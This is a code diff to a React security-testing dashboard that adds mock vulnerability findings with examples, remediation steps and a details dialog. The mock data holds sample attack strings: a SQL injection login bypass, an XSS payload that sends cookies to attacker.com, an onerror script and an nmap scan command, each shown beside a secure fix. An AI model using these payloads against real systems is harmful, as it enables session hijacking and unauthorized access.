@@ -68,6 +68,9 @@ interface VaptResult {
   description: string;
   affected: string;
   recommendation: string;
+  example: string;
+  resolutionSteps: string[];
+  impact: string;
 }
 
 interface VaptScenario {
@@ -115,6 +118,7 @@ test('sample test', async ({ page }) => {
   const [isVaptTesting, setIsVaptTesting] = useState(false);
   const [vaptResults, setVaptResults] = useState<VaptResult[]>([]);
   const [showBestPractices, setShowBestPractices] = useState(false);
+  const [viewingVaptResult, setViewingVaptResult] = useState<VaptResult | null>(null);
 
   // Mock data initialization
   useEffect(() => {
@@ -560,57 +564,135 @@ test('sample test', async ({ page }) => {
           id: "1",
           vulnerability: "SQL Injection",
           severity: "critical",
-          description: "Application is vulnerable to SQL injection attacks in the login form",
-          affected: "/api/auth/login",
-          recommendation: "Use parameterized queries and input validation"
+          description: "Application is vulnerable to SQL injection attacks in the login form. Attackers can bypass authentication and access unauthorized data.",
+          affected: "/api/auth/login, /api/search",
+          recommendation: "Use parameterized queries and input validation",
+          example: "Payload tested: admin' OR '1'='1' --\n\nVulnerable code:\nconst query = \"SELECT * FROM users WHERE username='\" + username + \"' AND password='\" + password + \"'\";\n\nThis allows attackers to inject SQL:\nUsername: admin' OR '1'='1' --\nPassword: anything\nResult: Bypasses authentication!\n\nSecure implementation:\nconst query = \"SELECT * FROM users WHERE username=? AND password=?\";\npreparedStatement.setString(1, username);\npreparedStatement.setString(2, hashedPassword);",
+          resolutionSteps: [
+            "Replace all string concatenation in SQL queries with parameterized queries",
+            "Implement input validation using whitelists for expected characters",
+            "Use ORM frameworks that automatically handle parameterization",
+            "Apply principle of least privilege to database accounts",
+            "Enable database query logging and monitoring for suspicious patterns",
+            "Implement Web Application Firewall (WAF) rules to detect SQL injection attempts"
+          ],
+          impact: "Attackers can read, modify, or delete sensitive database information. Complete database compromise possible including user credentials, financial data, and business-critical information."
         },
         {
           id: "2",
           vulnerability: "Cross-Site Scripting (XSS)",
           severity: "high",
-          description: "User input is not properly sanitized, allowing XSS attacks",
-          affected: "/search, /comment sections",
-          recommendation: "Implement Content Security Policy and encode all user inputs"
+          description: "User input is not properly sanitized in search results and comment sections, allowing stored and reflected XSS attacks.",
+          affected: "/search, /comments, /profile pages",
+          recommendation: "Implement Content Security Policy and encode all user inputs",
+          example: "Attack payload found:\n<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>\n\nVulnerable code:\n<div>Search results for: <%= userInput %></div>\n\nThis renders malicious scripts directly. When user searches for:\n<img src=x onerror=alert(document.cookie)>\n\nThe script executes and can:\n- Steal session cookies\n- Redirect to phishing sites\n- Modify page content\n- Perform actions as the victim\n\nSecure implementation:\nimport DOMPurify from 'dompurify';\nconst clean = DOMPurify.sanitize(userInput);\n// Or use framework auto-escaping:\n<div>Search results for: {userInput}</div> (React auto-escapes)",
+          resolutionSteps: [
+            "Implement Content-Security-Policy header with strict directives",
+            "HTML encode all user inputs: < becomes &lt;, > becomes &gt;",
+            "Use modern frameworks (React, Vue) that auto-escape by default",
+            "Sanitize HTML input using libraries like DOMPurify",
+            "Validate input on server-side, not just client-side",
+            "Set HttpOnly flag on cookies to prevent JavaScript access",
+            "Implement output encoding based on context (HTML, JavaScript, CSS, URL)"
+          ],
+          impact: "Attackers can execute malicious JavaScript in victim browsers, leading to session hijacking, credential theft, malware distribution, and website defacement."
         },
         {
           id: "3",
-          vulnerability: "Insecure Direct Object Reference",
+          vulnerability: "Insecure Direct Object Reference (IDOR)",
           severity: "high",
-          description: "Users can access unauthorized resources by modifying URL parameters",
-          affected: "/api/users/:id",
-          recommendation: "Implement proper authorization checks"
+          description: "Users can access unauthorized resources by manipulating URL parameters and IDs without proper authorization checks.",
+          affected: "/api/users/:id, /api/orders/:orderId, /api/documents/:docId",
+          recommendation: "Implement proper authorization checks for all resource access",
+          example: "Vulnerability demonstration:\n\nUser A (ID: 123) is logged in\nGET /api/users/123/profile → Works ✓\n\nUser A changes URL to:\nGET /api/users/456/profile → Also works! ✗\n\nUser A can now see User B's private profile, orders, and documents.\n\nVulnerable code:\napp.get('/api/orders/:orderId', (req, res) => {\n  const order = db.getOrder(req.params.orderId);\n  res.json(order); // No authorization check!\n});\n\nSecure implementation:\napp.get('/api/orders/:orderId', authenticate, (req, res) => {\n  const order = db.getOrder(req.params.orderId);\n  if (order.userId !== req.user.id && !req.user.isAdmin) {\n    return res.status(403).json({ error: 'Unauthorized' });\n  }\n  res.json(order);\n});",
+          resolutionSteps: [
+            "Implement authorization checks on every resource access",
+            "Use indirect references: map user-specific IDs to internal IDs",
+            "Validate that the authenticated user owns the requested resource",
+            "Implement Role-Based Access Control (RBAC)",
+            "Log and alert on authorization failures",
+            "Use framework-level middleware for consistent authorization",
+            "Never trust client-supplied IDs without verification"
+          ],
+          impact: "Unauthorized access to sensitive user data including personal information, financial records, private documents, and business data. Privacy violation and potential data theft."
         },
         {
           id: "4",
           vulnerability: "Missing Security Headers",
           severity: "medium",
-          description: "Critical security headers are not configured",
-          affected: "All endpoints",
-          recommendation: "Add X-Frame-Options, X-Content-Type-Options, and Strict-Transport-Security headers"
+          description: "Critical security headers are not configured, leaving the application vulnerable to various attacks.",
+          affected: "All endpoints and pages",
+          recommendation: "Add X-Frame-Options, X-Content-Type-Options, and Strict-Transport-Security headers",
+          example: "Current response headers:\nHTTP/1.1 200 OK\nContent-Type: text/html\n\nMissing headers:\n❌ X-Frame-Options (allows clickjacking)\n❌ X-Content-Type-Options (allows MIME sniffing)\n❌ Strict-Transport-Security (no HTTPS enforcement)\n❌ Content-Security-Policy (no XSS protection)\n❌ X-XSS-Protection (legacy but still useful)\n❌ Referrer-Policy (information leakage)\n\nSecure headers configuration:\nX-Frame-Options: DENY\nX-Content-Type-Options: nosniff\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nContent-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'\nX-XSS-Protection: 1; mode=block\nReferrer-Policy: strict-origin-when-cross-origin\nPermissions-Policy: geolocation=(), microphone=(), camera=()",
+          resolutionSteps: [
+            "Configure security headers in web server (Nginx/Apache) or application middleware",
+            "Set X-Frame-Options: DENY or SAMEORIGIN to prevent clickjacking",
+            "Add X-Content-Type-Options: nosniff to prevent MIME type sniffing",
+            "Enable HSTS: Strict-Transport-Security with long max-age",
+            "Implement comprehensive Content-Security-Policy",
+            "Use security header testing tools like securityheaders.com",
+            "Test headers in all environments (dev, staging, production)"
+          ],
+          impact: "Increased vulnerability to clickjacking, MIME sniffing attacks, XSS, and man-in-the-middle attacks. Reduced defense-in-depth protection."
         },
         {
           id: "5",
           vulnerability: "Weak Password Policy",
           severity: "medium",
-          description: "Password requirements are too weak",
-          affected: "/register",
-          recommendation: "Enforce minimum 12 characters with complexity requirements"
+          description: "Password requirements are insufficient, allowing users to create easily guessable passwords.",
+          affected: "/register, /change-password",
+          recommendation: "Enforce minimum 12 characters with complexity requirements",
+          example: "Current weak policy allows:\n- 'password123' ✓ (common password)\n- '12345678' ✓ (sequential numbers)\n- 'qwerty' ✓ (keyboard pattern)\n- 'admin' ✓ (too short)\n\nThese can be cracked in seconds!\n\nAttack simulation:\nBrute force rate: 1 billion attempts/second (GPU)\nPassword 'password': Cracked in 0.000001 seconds\nPassword 'P@ssw0rd': Cracked in 2 minutes\nPassword 'MyC0mpl3x!P@ssw0rd2024': Would take centuries\n\nSecure password policy:\nif (password.length < 12) return 'Too short';\nif (!/[A-Z]/.test(password)) return 'Need uppercase';\nif (!/[a-z]/.test(password)) return 'Need lowercase';\nif (!/[0-9]/.test(password)) return 'Need number';\nif (!/[!@#$%^&*]/.test(password)) return 'Need special char';\nif (commonPasswords.includes(password)) return 'Too common';",
+          resolutionSteps: [
+            "Enforce minimum 12-character password length",
+            "Require mix of uppercase, lowercase, numbers, and special characters",
+            "Check against common password databases (Have I Been Pwned API)",
+            "Implement password strength meter on registration page",
+            "Enforce password expiration policy (90-180 days)",
+            "Prevent password reuse (store last 5 password hashes)",
+            "Implement account lockout after 5 failed attempts",
+            "Use bcrypt or Argon2 for password hashing with high cost factor"
+          ],
+          impact: "User accounts vulnerable to brute force and dictionary attacks. Compromised accounts can lead to unauthorized access, data theft, and system abuse."
         },
         {
           id: "6",
           vulnerability: "Information Disclosure",
           severity: "low",
-          description: "Server version information exposed in response headers",
+          description: "Server version and technology stack information exposed in response headers and error pages.",
           affected: "All endpoints",
-          recommendation: "Remove or obfuscate server version headers"
+          recommendation: "Remove or obfuscate server version headers and error details",
+          example: "Exposed information:\n\nHTTP Headers:\nServer: Apache/2.4.41 (Ubuntu)\nX-Powered-By: PHP/7.4.3\n\nError page reveals:\n\"MySQL Error: Table 'users' doesn't exist at /var/www/app/auth.php line 45\"\n\nAttackers now know:\n- Server: Apache 2.4.41 (check for vulnerabilities)\n- OS: Ubuntu\n- Language: PHP 7.4.3 (has known CVEs)\n- Database: MySQL\n- File structure: /var/www/app/\n- Database table names\n\nWith this info, attackers can:\n1. Search for specific exploits\n2. Craft targeted attacks\n3. Map application structure\n\nSecure configuration:\nHTTP Headers:\nServer: (removed)\nX-Powered-By: (removed)\n\nError page:\n\"An error occurred. Please contact support with reference ID: ERR-2024-001\"\n(Actual error logged internally)",
+          resolutionSteps: [
+            "Remove Server header from all responses",
+            "Disable X-Powered-By header (PHP, Express, etc.)",
+            "Implement custom error pages without stack traces",
+            "Log detailed errors server-side, show generic messages to users",
+            "Disable directory listing on web server",
+            "Remove version numbers from public-facing assets",
+            "Use security.txt file to provide security contact info only"
+          ],
+          impact: "Provides attackers with reconnaissance information that aids in crafting targeted attacks. While not directly exploitable, it significantly reduces attack complexity."
         },
         {
           id: "7",
-          vulnerability: "SSL/TLS Configuration",
+          vulnerability: "Outdated TLS Configuration",
           severity: "info",
-          description: "Application supports outdated TLS protocols",
-          affected: "HTTPS endpoints",
-          recommendation: "Disable TLS 1.0 and 1.1, support only TLS 1.2 and above"
+          description: "Application supports outdated TLS 1.0 and 1.1 protocols which have known vulnerabilities.",
+          affected: "All HTTPS endpoints",
+          recommendation: "Disable TLS 1.0 and 1.1, support only TLS 1.2 and above with strong cipher suites",
+          example: "Current SSL/TLS configuration:\n✓ TLS 1.3 (Excellent)\n✓ TLS 1.2 (Good)\n⚠️ TLS 1.1 (Deprecated - VULNERABLE)\n⚠️ TLS 1.0 (Deprecated - VULNERABLE)\n✗ SSLv3 (Disabled - Good)\n\nVulnerabilities in TLS 1.0/1.1:\n- BEAST attack\n- POODLE attack\n- No support for modern ciphers\n\nWeak ciphers found:\n- TLS_RSA_WITH_RC4_128_MD5\n- TLS_RSA_WITH_3DES_EDE_CBC_SHA\n\nRecommended configuration (Nginx):\nssl_protocols TLSv1.2 TLSv1.3;\nssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';\nssl_prefer_server_ciphers on;\n\nTest command:\nnmap --script ssl-enum-ciphers -p 443 yourdomain.com",
+          resolutionSteps: [
+            "Disable TLS 1.0 and TLS 1.1 in web server configuration",
+            "Enable only TLS 1.2 and TLS 1.3",
+            "Configure strong cipher suites (forward secrecy)",
+            "Disable weak ciphers (RC4, 3DES, MD5)",
+            "Enable HSTS to force HTTPS connections",
+            "Use tools like SSL Labs to test configuration",
+            "Update certificates to use 2048-bit RSA or ECDSA keys",
+            "Implement OCSP stapling for certificate validation"
+          ],
+          impact: "Connections vulnerable to downgrade attacks and cryptographic weaknesses. Potential for man-in-the-middle attacks on older clients."
         }
       ];
 
@@ -1575,7 +1657,7 @@ test('sample test', async ({ page }) => {
                     <CardHeader>
                       <CardTitle className="text-lg">Security Findings</CardTitle>
                       <CardDescription>
-                        {vaptResults.length} vulnerabilities discovered
+                        {vaptResults.length} vulnerabilities discovered - Click on any finding for detailed analysis
                       </CardDescription>
                     </CardHeader>
                     <CardContent>
@@ -1586,21 +1668,31 @@ test('sample test', async ({ page }) => {
                             <TableHead>Severity</TableHead>
                             <TableHead>Description</TableHead>
                             <TableHead>Affected</TableHead>
-                            <TableHead>Recommendation</TableHead>
+                            <TableHead>Actions</TableHead>
                           </TableRow>
                         </TableHeader>
                         <TableBody>
                           {vaptResults.map((result) => (
-                            <TableRow key={result.id}>
+                            <TableRow key={result.id} className="cursor-pointer hover:bg-muted/50">
                               <TableCell className="font-medium">{result.vulnerability}</TableCell>
                               <TableCell>
                                 <Badge className={getSeverityColor(result.severity)}>
                                   {result.severity.toUpperCase()}
                                 </Badge>
                               </TableCell>
-                              <TableCell className="text-sm max-w-xs">{result.description}</TableCell>
+                              <TableCell className="text-sm max-w-xs truncate">{result.description}</TableCell>
                               <TableCell className="text-sm text-muted-foreground">{result.affected}</TableCell>
-                              <TableCell className="text-sm max-w-xs">{result.recommendation}</TableCell>
+                              <TableCell>
+                                <Button 
+                                  variant="ghost" 
+                                  size="sm"
+                                  onClick={() => setViewingVaptResult(result)}
+                                  className="gap-1"
+                                >
+                                  <FileText className="h-3 w-3" />
+                                  View Details
+                                </Button>
+                              </TableCell>
                             </TableRow>
                           ))}
                         </TableBody>
@@ -1611,6 +1703,81 @@ test('sample test', async ({ page }) => {
               </CardContent>
             </Card>
           </TabsContent>
+
+          {/* VAPT Result Details Dialog */}
+          <Dialog open={!!viewingVaptResult} onOpenChange={() => setViewingVaptResult(null)}>
+            <DialogContent className="max-w-5xl max-h-[85vh] overflow-y-auto">
+              <DialogHeader>
+                <DialogTitle className="flex items-center gap-3">
+                  <ShieldAlert className="h-5 w-5 text-destructive" />
+                  {viewingVaptResult?.vulnerability}
+                  {viewingVaptResult && (
+                    <Badge className={getSeverityColor(viewingVaptResult.severity)}>
+                      {viewingVaptResult.severity.toUpperCase()}
+                    </Badge>
+                  )}
+                </DialogTitle>
+              </DialogHeader>
+              {viewingVaptResult && (
+                <div className="space-y-5 mt-4">
+                  <div className="grid grid-cols-2 gap-4">
+                    <div>
+                      <Label className="text-sm font-semibold">Affected Endpoints</Label>
+                      <p className="text-sm text-muted-foreground mt-1">{viewingVaptResult.affected}</p>
+                    </div>
+                    <div>
+                      <Label className="text-sm font-semibold">Risk Impact</Label>
+                      <p className="text-sm text-destructive mt-1 font-medium">{viewingVaptResult.impact}</p>
+                    </div>
+                  </div>
+
+                  <div>
+                    <Label className="text-sm font-semibold">Vulnerability Description</Label>
+                    <p className="text-sm text-muted-foreground mt-2">{viewingVaptResult.description}</p>
+                  </div>
+
+                  <div>
+                    <Label className="text-sm font-semibold">Technical Details & Example</Label>
+                    <div className="bg-muted/30 p-4 rounded-md mt-2">
+                      <pre className="text-xs whitespace-pre-wrap font-mono text-foreground">
+{viewingVaptResult.example}
+                      </pre>
+                    </div>
+                  </div>
+
+                  <div>
+                    <Label className="text-sm font-semibold">Recommendation</Label>
+                    <p className="text-sm text-muted-foreground mt-2">{viewingVaptResult.recommendation}</p>
+                  </div>
+
+                  <div>
+                    <Label className="text-sm font-semibold">Step-by-Step Resolution Guide</Label>
+                    <div className="mt-3 space-y-3">
+                      {viewingVaptResult.resolutionSteps.map((step, index) => (
+                        <div key={index} className="flex items-start gap-3 p-3 bg-muted/20 rounded-md">
+                          <div className="flex-shrink-0 w-6 h-6 rounded-full bg-primary text-primary-foreground flex items-center justify-center text-xs font-bold">
+                            {index + 1}
+                          </div>
+                          <p className="text-sm text-foreground flex-1">{step}</p>
+                        </div>
+                      ))}
+                    </div>
+                  </div>
+
+                  <div className="flex gap-2 pt-4 border-t">
+                    <Button variant="outline" className="flex-1">
+                      <Download className="h-4 w-4 mr-2" />
+                      Export Report
+                    </Button>
+                    <Button variant="default" className="flex-1">
+                      <CheckCircle className="h-4 w-4 mr-2" />
+                      Mark as Resolved
+                    </Button>
+                  </div>
+                </div>
+              )}
+            </DialogContent>
+          </Dialog>
 
           {/* Best Practices Dialog */}
           <Dialog open={showBestPractices} onOpenChange={setShowBestPractices}>
